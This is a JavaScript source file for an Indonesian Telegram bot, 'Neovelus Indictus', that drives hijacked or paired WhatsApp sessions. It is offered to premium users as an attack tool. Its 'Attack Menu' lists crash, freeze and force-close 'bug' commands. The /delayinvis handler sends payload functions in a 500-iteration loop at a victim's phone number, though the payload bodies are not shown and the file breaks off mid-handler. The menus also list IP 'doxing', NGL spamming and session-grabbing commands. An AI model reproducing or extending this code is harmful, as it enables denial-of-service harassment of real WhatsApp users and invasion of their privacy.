/<BASE INI DIBUAT OLEH FaiqNotDev!>/
// HARGA YANG BUAT BASE INI,JANGAN HAPUS © 
//-- <HARGA YANG BUAT BASE INI>! --\\

/// ------ ( set const ) ------ \\\
const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("baileys")
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const ONLY_FILE = path.join(__dirname, "Faiq", "gconly.json");
const cd = path.join(__dirname, "Faiq", "cd.json");

/// --- ( Random Image ) --- \\\
const randomImages = [
  "https://files.catbox.moe/0hqnn3.png",
];

const getRandomImage = () => {
  return randomImages[Math.floor(Math.random() * randomImages.length)];
};

// ----------------- ( Identitas & Bypass @Bawzhhh ) ------------------- \\

// 1. Re-Definisi Bot (Biar gak error 'bot is not defined')
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

// 2. Fungsi Utama buat nyalain Telegram (Biar gak error 'startBot is not defined')
async function startBot() {
    console.log(chalk.green("✨ Mesin Telegram Berhasil Dinyalakan..."));
}

// 3. Sistem Bypass Validasi Token
async function validateToken() {
  console.clear();
  console.log(chalk.cyan(`
  ██████╗  █████╗ ██╗    ██╗███████╗██╗  ██╗██╗  ██╗██╗  ██╗
  ██╔══██╗██╔══██╗██║    ██║╚══███╔╝██║  ██║██║  ██║██║  ██║
  ██████╔╝███████║██║ █╗ ██║  ███╔╝ ███████║███████║███████║
  ██╔══██╗██╔══██║██║███╗██║ ███╔╝  ██╔══██║██╔══██║██╔══██║
  ██████╔╝██║  ██║╚███╔███╔╝███████╗██║  ██║██║  ██║██║  ██║
  ╚══════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
  `));
  console.log(chalk.red(`           SYSTEM CONNECTED BY @Bawzhhh`));
  console.log(chalk.white(`--------------------------------------------`));
  console.log(chalk.green(` ✅ Token Terverifikasi (Local System)`));
  console.log(chalk.green(` ✅ Memulai Koneksi WhatsApp & Telegram...`));
  console.log(chalk.white(`--------------------------------------------\n`));

  try {
    // Panggil fungsi buat nyalain semuanya
    await startBot(); 
    if (typeof initializeWhatsAppConnections === 'function') {
        initializeWhatsAppConnections(); 
    }
  } catch (err) {
    console.error(chalk.red("❌ Gagal menyalakan mesin:"), err.message);
  }
}

// Jalankan prosesnya!
validateToken();


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>｢ Ϟ ｣ Evo Enggine</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connected.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./Faiq/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./Faiq/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./Faiq/premium.json');
            ensureFileExists('./Faiq/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./Faiq/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./Faiq/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./Faiq/premium.json', (data) => (premiumUsers = data));
    watchFile('./Faiq/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};

const verifiedUsers = new Set();

const OTP_CODE = "050320";

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔒 Akses terkunci.\nMasukkan OTP dengan perintah:\n/otp <kode>"
    );
  }

  const username = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || "User";

  // Pilih 1 dari 6 jenis progres bar
  const types = ["loading", "bomb", "diamond", "circle", "rainbow", "wave"];
  const progressType = types[Math.floor(Math.random() * types.length)];

  let startMsg;

  // 1️⃣ Loading bar klasik
  if (progressType === "loading") {
    startMsg = await bot.sendMessage(chatId, "⚙️ Memuat sistem...");
    const bars = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 400));
      await bot.editMessageText(`⚙️ Memuat sistem...\n${bars[i]} ${((i + 1) * 20)}%`, {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // 2️⃣ Countdown bom
  else if (progressType === "bomb") {
    startMsg = await bot.sendMessage(chatId, "💣 Persiapan sistem...");
    const bars = ["💣 5...", "💣 4...", "💣 3...", "💣 2...", "💣 1...", "💥 BOOM!"];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 800));
      await bot.editMessageText(bars[i], {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // 3️⃣ Diamond / kristal
  else if (progressType === "diamond") {
    startMsg = await bot.sendMessage(chatId, "💠 Inisialisasi sistem...");
    const bars = [
      "💠▫️▫️▫️▫️",
      "💠💠▫️▫️▫️",
      "💠💠💠▫️▫️",
      "💠💠💠💠▫️",
      "💠💠💠💠💠"
    ];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 500));
      await bot.editMessageText(`💠 Inisialisasi sistem...\n${bars[i]}`, {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // 4️⃣ Circle bouncing
  else if (progressType === "circle") {
    startMsg = await bot.sendMessage(chatId, "⚪ Mengaktifkan modul...");
    const bars = [
      "⚬       ⚬",
      " ⦿     ⦿ ",
      "  ⚬   ⚬  ",
      "   ⦿ ⦿   ",
      "    ⚬⚬    "
    ];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 400));
      await bot.editMessageText(`⚪ Mengaktifkan modul...\n${bars[i]}`, {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // 5️⃣ Rainbow warna bergeser
  else if (progressType === "rainbow") {
    startMsg = await bot.sendMessage(chatId, "🌈 Sinkronisasi warna...");
    const bars = [
      "🟥🟧🟨🟩🟦🟪⬜",
      "⬜🟥🟧🟨🟩🟦🟪",
      "🟪⬜🟥🟧🟨🟩🟦",
      "🟦🟪⬜🟥🟧🟨🟩",
      "🟩🟦🟪⬜🟥🟧🟨"
    ];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 500));
      await bot.editMessageText(`🌈 Sinkronisasi warna...\n${bars[i]}`, {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // 6️⃣ Wave animasi gelombang
  else if (progressType === "wave") {
    startMsg = await bot.sendMessage(chatId, "🌊 Menyiapkan data...");
    const bars = [
      "🌊▫️▫️▫️▫️▫️",
      "▫️🌊▫️▫️▫️▫️",
      "▫️▫️🌊▫️▫️▫️",
      "▫️▫️▫️🌊▫️▫️",
      "▫️▫️▫️▫️🌊▫️",
      "▫️▫️▫️▫️▫️🌊"
    ];
    for (let i = 0; i < bars.length; i++) {
      await new Promise((r) => setTimeout(r, 300));
      await bot.editMessageText(`🌊 Menyiapkan data...\n${bars[i]}`, {
        chat_id: chatId,
        message_id: startMsg.message_id,
      });
    }
  }

  // Setelah animasi selesai
  setTimeout(async () => {
    try {
      await bot.deleteMessage(chatId, startMsg.message_id);
    } catch {}

    const photoUrl = "https://files.catbox.moe/0hqnn3.png";
    const date = new Date().toLocaleString("id-ID", {
      dateStyle: "full",
      timeStyle: "short",
    });
      
    await bot.sendPhoto(chatId, photoUrl, {
      caption: `
<blockquote>⬡═—⊱「 NEOVELUS INDICTUS 」⊰—═⬡
Hola User ${username} 

𖥂 INFORMASI BOT 𖥂
✧ Username : ${username}  
✧ Developer : @Bawzhhh 
✧ Version : 1.0 
✧ Prefix : /  
</blockquote> 
<blockquote>⬡═—⊱「 THANKS TOO  」⊰—═⬡

✧ @Bawzhhh ( Developer )
✧ @sniitv  ( Best Friend)
✧ @rixzzxz ( Friend )
✧ @Xatanicvxii ( My Inspiration )
✧ @Allah ( My God )
✧ Orang Tua ( The Best My Support )

</blockquote> 
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
        { text: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", callback_data: "ownermenu" },
        { text: "𝐓𝐨𝐨𝐥𝐬", callback_data: "tools" }
      ],
      [
        { text: "𝐂𝐲𝐛𝐞𝐫 𝐓𝐨𝐨𝐥𝐬", callback_data: "cybermenu" },
        { text: "𝐓𝐨𝐨𝐥𝐬 𝐓𝐰𝐨²", callback_data: "tools2" }
      ],
      [
        { text: "𝐀𝐭𝐭𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "bugshow" }
      ],
      [
        { text: "𝐀𝐛𝐨𝐮𝐭", url: "https://t.me/AboutMybawz" } 
          ],
        ],
      },
    });
    
    setTimeout(() => {
        bot.sendAudio(chatId, fs.createReadStream("SINGGLE ERA/lagu.mp3"), {
            title: "Neovelus Indictus",
            performer: "t.me/Bawzhhh",
            caption: `<pre> Neovelus Indictus🚀 </pre>`,
            parse_mode: "HTML"
        });
    }, 100); 
  }); 
}); 

bot.on("callback_query", async (callbackQuery) => {
  try {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const randomImage = getRandomImage();
    const senderId = callbackQuery.from.id;
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
    const date = getCurrentDate(); // tambahkan date agar tidak undefined

    let newCaption = "";
    let newButtons = [];

    if (data === "bugshow") {
      newCaption = `
<blockquote>BUG ⵢ MENU ⚘</blockquote>
  ✧ /delayinvis
  ╰➤ hard delay invisible 
  ✧ /crashinvisible 
  ╰➤ Crash Invis
  ✧ /blankdevice 
  ╰➤ blank device 
    ✧ /Forclose 
  ╰➤ Forclose No Click
      ✧ /Forclose2
  ╰➤ Forclose No Click Hard
       
<blockquote>©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
          } else if (data === "cybermenu") {
      newCaption = `
<blockquote>cyber ⵢ menu ⚘</blockquote>
 ✧ /trackipcyber
 ✧ /doxipcyber
<blockquote>©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
    } else if (data === "ownermenu") {
      newCaption = `
<blockquote>Owner ⵢ Menu ⚘</blockquote>
 ✧ /addprem - Add premium user
 ✧ /delprem - delete premium users
 ✧ /addadmin - add admin user
 ✧ /deladmin - delete admin users
 ✧ /listprem - list user premium
 ✧ /setjeda 1m - coldown 
 ✧ /addbot 628xx - addsender number
<blockquote>©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
} else if (data === "tools2") {
      newCaption = `
<blockquote>Md ⵢ Menu2 ⚘</blockquote>
 ✧ /ocr - ambil text yg ad di foto
 ✧ /gpt 
 ✧ /trackip
 ✧ /getsession - via adp
 ✧ /play 
 ✧ /spotifysearch 
 ✧ /FaiqNotDev - edit foto jadi bergerak 
 ✧ /hd 
 ✧ /pinterest
 ✧ /tiktokdl - download vid tiktok
 ✧ /fixeror - replay file .js
 ✧ /nulis
 ✧ /broadcast 
 ✧ /totaluser
 ✧ /tta - ubah teks jadi suara
 ✧ /hentai
 ✧ /girl-china
 ✧ /gril-japan
 ✧ /gril-indonesia
 ✧ /hdvid
 ✧ /happymodsearch
 ✧ /xnxxsearch
 ✧ /xvideosearch 
 ✧ /ttsearch
 ✧ /reactch - WhatsApp 
 ✧ /terabox - dl vid terabox 
 ✧ /spamngl
 ✧ /saveweb
 ✧ /checksyntax 
 ✧ /listharga - list harga script 
 ✧ /sendbokep
 ✧ /chatowner 
<blockquote>©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
    } else if (data === "tools") {
      newCaption = `
<blockquote>Md ⵢ Menu ⚘</blockquote>
✧ /iqc 
✧ /brat 
✧ /ig
✧ /cekid
✧ /whoami
✧ /antilink on/off
✧ /stat - cek pengguna aktif
✧ /maps - jakarta,dll
✧ /duel - username lawan
✧ /speed - mengukur respon bot 
✧ /cuaca - kota
✧ /getcode 
✧ /uptime - berapa lama bot aktif
✧ /pair - cek pasangan hari ini
✧ /setrules - buat aturan gb
✧ /rules - cek aturan gb
✧ /tagadmin - tagall admin
✧ /admins - cek berapa admin
✧ /groupinfo - info group 
✧ /restartbot - restart panel
✧ /shortlink - memperpendek link
✧ /fileinfo - cek file 
✧ /negarainfo - info negara 
✧ /sticker - ubah foto jadi sticker 
✧ /beritaindo - berita indo hari ini
✧ /logo - membuat logo dari teks
✧ /pantun - lucu,cinta,bijak
✧ /trending - berita teratas hari ini 
✧ /katahariini - kata-kata hari ini
✧ /motivasi - motivasi untuk anda
✧ /hariini - tanggal,jam,
✧ /faktaunik - fakta unik
✧ /dunia - berita dunia 
✧ /gempa - cek gempa hari ini
✧ /telkon
✧ /fixcode
✧ /qc
✧ /bratvid

<blockquote>©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
    } else if (data === "Thanksto") {
      newCaption = `
<blockquote>༑𖣂 Thanks Too 𖣂 ༑
 ✧ @Bawzhhh( Developer )
 ✧ @snitv ( Best Friends And Best support )
 ✧ @rixzzxz ( Best Friends
 ✧ @Xatanicvxii ( My Inspiration )
 ✧ @Allah ( My God )
 ✧ Orang Tua ( The Best Support )
 

 
©️ Neovelus Indictus</blockquote>
      `;
      newButtons = [
        [{ text: "! Back To", callback_data: "mainmenu" }]
      ];
    } else if (data === "mainmenu") {
      newCaption = `
<blockquote>⬡═—⊱「 NEOVELUS INDICTUS 」⊰—═⬡
Hola User ${username} 

𖥂 INFORMASI BOT 𖥂
✧ Username : ${username}  
✧ Developer : @Bawzhhh 
✧ Version : 1.0 
✧ Prefix : /  
</blockquote> 
<blockquote>⬡═—⊱「 THANKS TOO  」⊰—═⬡

✧ @Bawzhhh ( Developer )
✧ @sniitv  ( Best Friend)
✧ @rixzzxz ( Friend )
✧ @Xatanicvxii ( My Inspiration )
✧ @Allah ( My God )
✧ Orang Tua ( The Best My Support )

</blockquote> 
      `,
      newButtons = [
        [
        { text: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", callback_data: "ownermenu" },
        { text: "𝐓𝐨𝐨𝐥𝐬", callback_data: "tools" }
      ],
      [
        { text: "𝐂𝐲𝐛𝐞𝐫 𝐓𝐨𝐨𝐥𝐬", callback_data: "cybermenu" },
        { text: "𝐓𝐨𝐨𝐥𝐬 𝐓𝐰𝐨²²", callback_data: "tools2" }
      ],
      [
        { text: "𝐀𝐭𝐭𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "bugshow" }
      ],
      [
        { text: "𝐀𝐛𝐨𝐮𝐭", url: "https://t.me/AboutMybawz" }
        ]
      ];
    } else {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Menu tidak dikenal", show_alert: false });
    }

    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: newButtons }
    });

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (err) {
    console.error("Gagal edit media:", err);
    bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
  }
}); // <-- Penutup yang benar

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/// --- ( Case Bug ) --- \\\
bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ Evo Enggine</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Bawzhhh" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : delayinvisible
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : delayinvisible
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 500; i++) {
      await PaysQl(sock, target);
      await NativeflowDelay(sock, target);
      await hard(target, mention = true);
      await carouselOverload(sock, target);
    }

    console.log(chalk.red(`𖣂 Evo Engine Attack Target 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : delayinvisible
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/blankdevice (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Bawzhhh" }]
        ]
      }
    });
  }

